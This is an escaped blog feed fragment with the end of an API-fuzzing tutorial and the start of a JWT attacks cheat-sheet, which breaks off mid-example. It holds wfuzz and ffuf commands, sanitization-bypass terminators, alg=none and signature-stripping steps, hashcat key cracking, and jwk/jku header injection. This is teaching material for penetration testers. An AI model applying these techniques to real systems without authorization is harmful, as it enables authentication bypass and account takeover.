&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_222423.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_222612.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Now in each iteration, each of the parameters will have its value from the payload file.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The total number of requests generated in the attack is the number of payloads in the smallest payload set.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;For &lt;code&gt;Cluster Bomb&lt;/code&gt; :&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;This is How we set the payload file&lt;/td&gt;
&lt;td&gt;Preview in Postman Collection Runner&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_224247.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_224435.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;The total number of requests generated in the attack is the product of the number of payloads in all defined payload sets - this may be extremely large.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We could&amp;rsquo;ve used of course different payload list for each parameter (for example &lt;code&gt;naughtyValue1&lt;/code&gt; for &lt;em&gt;ewallet&lt;/em&gt; and &lt;code&gt;naughtyValue2&lt;/code&gt; for &lt;em&gt;contact&lt;/em&gt;, but we need to append the two lists , this is similar to Sniper Attack in Burp Intruder, the Difference is that we can run this across all API endpoints , while in burp we have to run the attack for each endpoint manually.&lt;/p&gt;
&lt;h3 id=&#34;75---fuzzing-deep-w-burpsuite&#34;&gt;7.5 - Fuzzing Deep w/ &lt;em&gt;Burpsuite&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt;Fuzzing with Burp is very common so I guess you can skip this section, we are not going to dive deep here anyway.&lt;/p&gt;
&lt;p&gt;To send the request to Burp, just set up the proxy in Postman and Burp:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_211050.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Send the request from Postman and you&amp;rsquo;ll see the request in Burp HTTP History:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_221016.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;You can now send it to the intruder, set parameters to fuzz, and payload sets and attacks type then start the attack &amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_221114.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;76---fuzzing-deep-w-wfuzz&#34;&gt;7.6 - Fuzzing Deep w/ &lt;em&gt;Wfuzz&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt;One advantage of &lt;code&gt;Wfuzz&lt;/code&gt; is that it’s considerably faster than Burp Suite, so we can increase our payload size.&lt;/p&gt;
&lt;p&gt;This is an example on how to perform Battering ram Attack, specifying the access_token for authentication and the body data. we filtered &lt;code&gt;400&lt;/code&gt; Code Status, the &lt;code&gt;-p 127.0.0.1:8080&lt;/code&gt; is for proxying your request to Burp, which is optional of course, you can use it to see if the requests that are by &lt;code&gt;Wfuzz&lt;/code&gt; are malformed so that you can fix something in your one-liner:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wfuzz -z file,/home/kali/big-list-of-naughty-strings.txt -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type: application/json&amp;#34;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;x-access-token: [...]&amp;#34;&lt;/span&gt; --hc &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; -X PUT -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	\&amp;#34;user\&amp;#34;: \&amp;#34;FUZZ\&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	\&amp;#34;pass\&amp;#34;: \&amp;#34;FUZZ\&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	\&amp;#34;id\&amp;#34;: \&amp;#34;FUZZ\&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	\&amp;#34;name\&amp;#34;: \&amp;#34;FUZZ\&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	\&amp;#34;is_admin\&amp;#34;: \&amp;#34;FUZZ\&amp;#34;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	\&amp;#34;account_balance\&amp;#34;: \&amp;#34;FUZZ\&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;TARGET_URL&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;77---fuzzing-wide-for-improper-assets-management&#34;&gt;7.7 - Fuzzing Wide for Improper Assets Management&lt;/h3&gt;
&lt;p&gt;Improper assets management vulnerabilities arise when an organization exposes APIs that are either retired, in a test environment, or still in development. In any of these cases, there is a good chance the API has fewer protections than its supported production counterparts. Improper assets management might affect only a single endpoint or request, so it’s often useful to fuzz wide to test if improper assets management exists for any request across an API.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In order to fuzz wide for this problem, it helps to have a specification of the API or a
collection file that will make the requests available in Postman. This section assumes
you have an API collection available&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;You can find improper assets management vulnerabilities by paying close attention to outdated API documentation. If the production version of the sample API is &lt;strong&gt;v2&lt;/strong&gt;, so it would be a good idea to test a few keywords, like &lt;strong&gt;v1&lt;/strong&gt;, &lt;strong&gt;v3&lt;/strong&gt;, &lt;strong&gt;test&lt;/strong&gt;, &lt;strong&gt;mobile&lt;/strong&gt;, &lt;strong&gt;uat&lt;/strong&gt;, &lt;strong&gt;dev&lt;/strong&gt;, and &lt;strong&gt;old&lt;/strong&gt;, as well as any interesting paths discovered during analysis or reconnaissance testing. Additionally, some API providers will allow access to administrative functionality by adding /internal/ to the path before or after the versioning, which would look like this: &lt;code&gt;/api/v2/internal/users&lt;/code&gt; &lt;code&gt;/api/internal/v2/users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;You can use Postman Collection Runner, use &amp;ldquo;Find and Replace&amp;rdquo; to replace  &lt;code&gt;v3&lt;/code&gt; across all the collection by &lt;code&gt;v1&lt;/code&gt; , run the collection and look for anomalies, you can repeat the same for &lt;code&gt;dev&lt;/code&gt;, &lt;code&gt;test&lt;/code&gt; &amp;hellip; (This is Wide Fuzzing)&lt;/p&gt;
&lt;p&gt;To make our testing easier, we’ll set up the same test for status codes of 200 we used earlier in this chapter. If the API provider typically responds with status code 404 for non existent resources, a 200 response for those resources would likely indicate that the API is vulnerable.&lt;/p&gt;
&lt;p&gt;. If you discover an improper asset management vulnerability,
your next step will be to test the non-production endpoint for additional
weaknesses.&lt;/p&gt;
&lt;h2 id=&#34;8---testing-request-methods-with-wfuzz&#34;&gt;8 - Testing Request Methods with Wfuzz&lt;/h2&gt;
&lt;p&gt;You can fuzz an endpoint&amp;rsquo;s supported HTTP Methods:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wfuzz -z list,GET-HEAD-POST-PUT-PATCH-TRACE-OPTIONS-CONNECT- -X FUZZ http://target.com/api/v2/account
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;********************************************************
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* Wfuzz 3.1.0 - The Web Fuzzer *
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;********************************************************
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Target: http://testsite.com/api/v2/account
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Total requests: 8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;==========================================================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ID Response Lines Word Chars Payload
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;==========================================================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000008: &lt;span style=&#34;color:#ae81ff&#34;&gt;405&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;163&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CONNECT&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000004: &lt;span style=&#34;color:#ae81ff&#34;&gt;405&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;163&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PUT&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000005: &lt;span style=&#34;color:#ae81ff&#34;&gt;405&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;163&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PATCH&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000007: &lt;span style=&#34;color:#ae81ff&#34;&gt;405&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;163&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;OPTIONS&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000006: &lt;span style=&#34;color:#ae81ff&#34;&gt;405&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;163&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TRACE&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000002: &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HEAD&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000001: &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;107&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;2610&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000000003: &lt;span style=&#34;color:#ae81ff&#34;&gt;405&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; L &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; W &lt;span style=&#34;color:#ae81ff&#34;&gt;1503&lt;/span&gt; Ch &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can now see valid Methods (those with Status Code &lt;code&gt;200&lt;/code&gt; and Methods Not Allowed ones &lt;code&gt;405&lt;/code&gt; )&lt;/p&gt;
&lt;h2 id=&#34;9---fuzzing-deeper-to-bypass-input-sanitization&#34;&gt;9 - Fuzzing “Deeper” to Bypass Input Sanitization&lt;/h2&gt;
&lt;p&gt;In case you are fuzzing a sanitized parameter, let&amp;rsquo;s say that the email field only accept emails formats ( for example &lt;code&gt;user@gmail.com&lt;/code&gt; ) in this case you can append a string terminator (&lt;code&gt;%00&lt;/code&gt; in this case) to the email, followed by the variable that will be fuzzed:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;email&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a@b.com%00§test§&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Better yet, there are enough possible symbols to send that you could add a second payload position for typical escape characters, like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a@b.com§escape§§test§&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;String terminators you can use&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;%00
0x00
//
;
%
!
?
[]
%5B%5D
%09
%0a
%0b
%0c
%0e
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Use a set of potential escape symbols for the §escape§ payload and the payload you want to execute as the §test§. To perform this test, use Burp Suite’s cluster bomb attack.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_234218.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;10---summary&#34;&gt;10 - Summary&lt;/h2&gt;
&lt;p&gt;This blog covered the art of fuzzing APIs, one of the most important attack techniques you’ll need to master. By sending the right inputs to the right parts of an API request, you can discover a variety of API weaknesses. We covered two strategies, fuzzing wide and deep, useful for testing the entire attack surface of large APIs.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>JWTs Attacks Cheat-Sheet</title>
      <link>https://flowhero.github.io/newblog/posts/jwts-attacks/</link>
      <pubDate>Sun, 13 Aug 2023 11:47:29 +0100</pubDate>
      
      <guid>https://flowhero.github.io/newblog/posts/jwts-attacks/</guid>
      <description>Toolkits jwt.io hashcat JSON Web Key Burpsuite Extension jwt_tool.py rsa_sign2n I - JWKS common locations If you don&amp;rsquo;t know what JWTs are yet, please check https://jwt.io/introduction, it&amp;rsquo;ll take you about 5 minutes to read.
First thing we can do, is looking for any exposed JWTs keys (or set of keys) on common locations (JSON Web Key Store) file. Some common locations for this would be:
/.well-known/jwks.json /openid/connect/jwks.json /jwks.json /api/keys /api/v1/keys To automate this, you can use common.</description>
      <content>&lt;h2 id=&#34;toolkits&#34;&gt;Toolkits&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://jwt.io&#34;&gt;jwt.io&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hashcat&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;JSON Web Key&lt;/code&gt; Burpsuite Extension&lt;/li&gt;
&lt;li&gt;&lt;code&gt;jwt_tool.py&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsa_sign2n&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/1aAH0mMomx1dLidhoNCVmNw.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;i---jwks-common-locations&#34;&gt;I - JWKS common locations&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;If you don&amp;rsquo;t know what JWTs are yet, please check &lt;a href=&#34;https://jwt.io/introduction&#34;&gt;https://jwt.io/introduction&lt;/a&gt;, it&amp;rsquo;ll take you about 5 minutes to read.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;First thing we can do, is looking for any exposed JWTs keys (or set of keys) on common locations (JSON Web Key Store) file. Some common locations for this would be:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/.well-known/jwks.json&lt;/li&gt;
&lt;li&gt;/openid/connect/jwks.json&lt;/li&gt;
&lt;li&gt;/jwks.json&lt;/li&gt;
&lt;li&gt;/api/keys&lt;/li&gt;
&lt;li&gt;/api/v1/keys&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To automate this, you can use &lt;code&gt;common.txt&lt;/code&gt; wordlist under Web-Contet directory on the SecLists Github Repository:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -u &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;TARGET&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;.com/FUZZ -w ~/tools/SecLists-2023.2/Discovery/Web-Content/common.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There are two standard header claims that can direct the service to the &lt;strong&gt;Public Key&lt;/strong&gt; for verification:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;jku&lt;/strong&gt; - a claim pointing towards the JWKS URL&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;x5u&lt;/strong&gt; - a claim pointing towards the X509 certificate location (could be in a JWKS file)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This is how JWTs keys would look like :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{ 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;keys&amp;#34;&lt;/span&gt;: 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[ 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{ 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;kty&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RSA&amp;#34;&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AQAB&amp;#34;&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;kid&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;75d0ef47-af89-47a9-9061-7c02a610d5ab&amp;#34;&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;n&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ii---attacks-on-jwt&#34;&gt;II - Attacks on JWT&lt;/h2&gt;
&lt;h3 id=&#34;21---jwt-authentication-bypass-via-unverified-signature&#34;&gt;2.1 - JWT authentication bypass via unverified signature&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Just change the JWT body(=payload) and send the request leaving the signature as is and check if the server is checking the signature.
( For example if in the payload part of the token you can just change &amp;ldquo;name&amp;rdquo; to another user&amp;rsquo;s name and use the updated token to see if you can access his account )&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;22---jwt-authentication-bypass-via-flawed-signature-verification&#34;&gt;2.2 - JWT authentication bypass via flawed signature verification&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Change Body&lt;/li&gt;
&lt;li&gt;Change &lt;em&gt;alg&lt;/em&gt; to &lt;strong&gt;none&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Remove Signature part (Not the dot at the end)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;23---jwt-authentication-bypass-via-weak-signing-key&#34;&gt;2.3 - JWT authentication bypass via weak signing key&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Crack Key used for Signature&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashcat -a &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; -m &lt;span style=&#34;color:#ae81ff&#34;&gt;16500&lt;/span&gt; &amp;lt;YOUR-JWT&amp;gt; /path/to/jwt.secrets.list
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Change body in &lt;a href=&#34;https://jwt.io&#34;&gt;jwt.io&lt;/a&gt; and enter Key in Trailer field&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;24---jwt-authentication-bypass-via-jwk-header-injection&#34;&gt;2.4 - JWT authentication bypass via jwk header injection&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Generate RSA&lt;/li&gt;
&lt;li&gt;Repeater -&amp;gt; JSON Web Token TAB -&amp;gt; Attack -&amp;gt; Embedded JWK&lt;/li&gt;
&lt;li&gt;Notice &lt;em&gt;jwk&lt;/em&gt; added in header&lt;/li&gt;
&lt;li&gt;Change body&lt;/li&gt;
&lt;li&gt;Send request&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Instead of using the built-in attack in the JWT Editor extension, you can embed a JWK by adding a &lt;code&gt;jwk&lt;/code&gt; parameter to the header of the JWT manually. In this case, you need to also update the &lt;code&gt;kid&lt;/code&gt; header of the token to match the &lt;code&gt;kid&lt;/code&gt; of the embedded key.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;25---jwt-authentication-bypass-via-jku-header-injection&#34;&gt;2.5 - JWT authentication bypass via jku header injection&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Generate RSA&lt;/li&gt;
&lt;li&gt;Copy PK as JWK&lt;/li&gt;
&lt;li&gt;Create an endpoint of the PK:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{ 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;keys&amp;#34;&lt;/span&gt;: 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[ 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{ 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;kty&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RSA&amp;#34;&lt;/span&gt;, 
